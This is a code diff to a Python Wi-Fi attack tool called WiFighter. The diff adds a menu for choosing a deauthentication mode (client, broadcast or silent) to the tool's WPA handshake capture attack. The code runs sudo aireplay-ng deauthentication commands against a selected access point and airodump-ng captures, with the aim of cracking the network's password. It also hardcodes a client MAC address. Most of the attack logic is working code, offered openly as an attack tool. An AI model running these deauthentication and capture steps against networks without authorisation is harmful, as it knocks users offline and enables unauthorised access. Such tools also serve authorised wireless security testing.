@@ -36,11 +36,13 @@ LOGO = r"""
 
 interfering_services = ['NetworkManager', 'wpa_supplicant']
 attack_list = ['Handshake Crack', 'WPS Brute Force']
+deauth_modes = ['Client deauth', 'Broadcast', 'Silent']
 
 wifi_networks = []
 interface = None
 target_ap = None
 attack = None
+attack_mode = None
 
 # Get the full path of wifighter dir
 wifighter_path = os.path.dirname(os.path.abspath(__file__))
@@ -50,9 +52,6 @@ wifighter_path = os.path.dirname(os.path.abspath(__file__))
  # | INTRODUCTION | #
 
 def introduction():
-
-     # | INTRODUCTION | #
-
      os.system('clear')
      # Show logo
      print(f"{BLUE}{LOGO}{RESET}")
@@ -62,6 +61,13 @@ def introduction():
      #print(" ")
      #print(f"{MAGENTA}Build by Filip Struhar | https://github.com/FilipStruhar{RESET}")
 
+     print()
+     print()
+
+def logo():
+     os.system('clear')
+     # Show logo
+     print(f"{BLUE}{LOGO}{RESET}")
      print()
      print()
 
@@ -218,11 +224,13 @@ def choose_target():
 def choose_attack(target_ap):
      global attack_list
 
+     print(f'{MAGENTA}| Attack Modes |{RESET}')
+     print()
      target_ap = target_ap['BSSID'] + ' -> ' + target_ap['SSID'] if target_ap['SSID'] else target_ap['BSSID']
-     # Show detected interfaces
-     print(f'{MAGENTA}Select attack on {target_ap}{RESET}')
+     print(f'Select attack on {target_ap}')
 
      idx = 1
+     # Show attack modes
      for attack in attack_list:
           print(f"{idx}. {attack}")
           idx += 1
@@ -243,6 +251,36 @@ def choose_attack(target_ap):
                     print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
      except KeyboardInterrupt:
           print(f"\n\n{BLUE}Exiting the tool...{RESET}")
+
+def choose_deauth_mode():
+     global deauth_modes
+     
+     print(f'{MAGENTA}| Deauth Modes |{RESET}')
+     print()
+
+     idx = 1
+     # Show attack modes
+     for deauth_mode in deauth_modes:
+          print(f"{idx}. {deauth_mode}")
+          idx += 1
+     try:
+          while True:     
+               try:
+                    # Prompt the user to choose an deauth mode by number
+                    choice = int(input(f"\nSelect the deauth_mode number: ")) - 1
+               except ValueError:
+                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
+                    continue
+
+               # Check if the choice is in range
+               if 0 <= choice < len(deauth_modes):
+                    deauth_mode = deauth_modes[choice]
+                    return deauth_mode # Return chosen deauth mode
+               else:
+                    print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
+     except KeyboardInterrupt:
+          print(f"\n\n{BLUE}Exiting the tool...{RESET}")
+
      
 
  #------------------------------------------------------------------------------------
@@ -393,16 +431,19 @@ def list_ap(wifi_networks):
 
 # | Attacks | #
 
-def handshake_crack(target_ap, interface):
+def handshake_crack(target_ap, interface, deauth_mode):
+     # Prepare variables
      ssid = target_ap['SSID'] if target_ap['SSID'] else None
      bssid = target_ap['BSSID'] if target_ap['BSSID'] else None
+     target = ssid if ssid else bssid # Set target by checking if SSID set
      channel = target_ap['Channel'] if target_ap['Channel'] else None
+     deauth_mode = deauth_mode.lower()
+     client_mac = '02:26:02:03:25:e0'
 
-     deauth_type = "broadcast"
-     client_mac = None
 
      global wifighter_path
-     output_dir = f"{wifighter_path}/attacks/{ssid.replace(' ', '_')}"
+     output_dir = f"{wifighter_path}/attacks/{target.replace(' ', '_')}"
+
 
      def list_files(directory): 
           return set(os.listdir(directory))
@@ -414,12 +455,12 @@ def handshake_crack(target_ap, interface):
                if '.cap' in filename:
                     return filename  
 
-     def create_cap_dir(ssid):
-          if ssid:
+     def create_cap_dir(target):
+          if target:
                if os.path.exists(output_dir):
                     pass
                else:
-                    print(f"Creating capture directory -> WiFighter/attacks/{ssid.replace(' ', '_')}")
+                    print(f"Creating capture directory -> WiFighter/attacks/{target.replace(' ', '_')}")
                     os.system(f'mkdir {output_dir}')
                     print()       
 
@@ -443,9 +484,10 @@ def handshake_crack(target_ap, interface):
                     pass
 
      # Run aireplay-ng
-     def run_aireplay(interface, bssid, client_mac, deauth_type):
-          if interface and bssid and deauth_type:
-               if deauth_type == "client":
+     def run_aireplay(interface, bssid, client_mac, deauth_mode):
+          if interface and bssid and deauth_mode:
+               print(deauth_mode)
+               if deauth_mode == "client deauth":
                     if client_mac:
                          try:
                               command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', client_mac, interface]
@@ -453,24 +495,22 @@ def handshake_crack(target_ap, interface):
                               print(f"{CYAN}[>]{RESET} Deauth packet send to client {client_mac}{RESET}")
                          except:
                               pass
-               elif deauth_type == "broadcast":
+               elif deauth_mode == "broadcast":
                     try:
                          command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, interface]
                          subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                          print(f"{CYAN}[>]{RESET} Deauth packet send to broadcast")
                     except:
                          pass
-
-
-     print(f'{MAGENTA}| Handshake Crack | {ssid} - {bssid} | {interface} |{RESET}')
-     #print(f'Attacking on {ssid} ({bssid}) on {interface}')
+     
+     print(f'Attacking on {ssid} ({bssid}) on {interface}')
      print()
 
-     create_cap_dir(ssid) # Create capture dir if not exist
+     create_cap_dir(target) # Create capture dir if not exist
 
      # Define processes
      capture_handshake = multiprocessing.Process(target = run_airodump, args=(interface, bssid, channel, output_dir))
-     deauth_client = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, client_mac, deauth_type))
+     deauth_client = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, client_mac, deauth_mode))
 
      files_before = list_files(output_dir) # Get files before airodump-ng adds new
 
@@ -478,17 +518,17 @@ def handshake_crack(target_ap, interface):
      capture_handshake.start() # Start airodump-ng process
      time.sleep(2)
 
-     # Deauth client/s
-     deauth_client.start() # Start aireplay-ng process
-
-     deauth_client.join() # Wait for the process to stop
+     # Deauth client/s if selected
+     if deauth_mode != 'silent':
+          deauth_client.start() # Start aireplay-ng process
+          deauth_client.join() # Wait for the process to stop
 
      files_after = list_files(output_dir) # Get files after airodump-ng adds new
      output_file = cap_file(files_before, files_after) # Determine output_file in which airodump-ng stores
 
      # Wait and verify that handshake was captured successfuly
      captured = False
-     print(f"{CYAN}[>]{RESET} Waiting for handshake... -> Capture file will be saved -> WiFighter/attacks/{ssid.replace(' ', '_')}/{output_file}")
+     print(f"{CYAN}[>]{RESET} Waiting for handshake... -> Capture file will be saved -> WiFighter/attacks/{target.replace(' ', '_')}/{output_file}")
      while not captured:
           if os.path.exists(f"{output_dir}/{output_file}"):
                try:
@@ -550,15 +590,12 @@ else:
      # | WIFIGHTER TOOL |
 
      introduction()
-     # Choose scanning/attacking interface
-     interface = choose_interface()
+     interface = choose_interface() # Choose scanning/attacking interface
 
      # Scan and choose target AP
      if interface:
-          # Make sure interface is in Managed
-          monitor_switch(None, 'stop', interface)
-          # Make sure network services are running
-          start_services(None)
+          monitor_switch(None, 'stop', interface) # Make sure interface is in Managed
+          start_services(None) # Make sure network services are running
           try:
                while True:
                     # Get available AP's
@@ -567,7 +604,7 @@ else:
                          wifi_networks = scan_output 
                     if wifi_networks:
                          print(wifi_networks)
-                         introduction()
+                         logo()
                          list_ap(wifi_networks) # Show available AP's in table
                     time.sleep(1) # Wait before each scan
           except KeyboardInterrupt:
@@ -578,21 +615,25 @@ else:
 
      # List attack possibilities
      if target_ap:
-          introduction()
+          logo()
           attack = choose_attack(target_ap)
      
      if attack:
-          introduction()
+          logo()
           if attack == 'Handshake Crack':
-               # Make sure interface is in Monitor
-               monitor_switch(None, 'start', interface)
-               # Make sure interfering services are not running
-               stop_services(None)
-               try:
-                    handshake_crack(target_ap, interface)
-               except:
-                    print(f"\n\n{BLUE}Exiting the tool...{RESET}")
+               deauth_mode = choose_deauth_mode()
+               if deauth_mode:
+                    logo()
+                    print(f'{MAGENTA}| Handshake Crack |{RESET}')
+                    monitor_switch(None, 'start', interface) # Make sure interface is in Monitor
+                    stop_services(None) # Make sure interfering services are not running
+                    try:
+                         handshake_crack(target_ap, interface, deauth_mode) # Start attack
+                    except KeyboardInterrupt:
+                         print(f"\n\n{BLUE}Exiting the tool...{RESET}")
      
-     monitor_switch(None, 'stop', interface)
-
+     try:
+          monitor_switch(None, 'stop', interface)
+     except KeyboardInterrupt:
+          print(f"\n\n{BLUE}Exiting the tool...{RESET}")
      
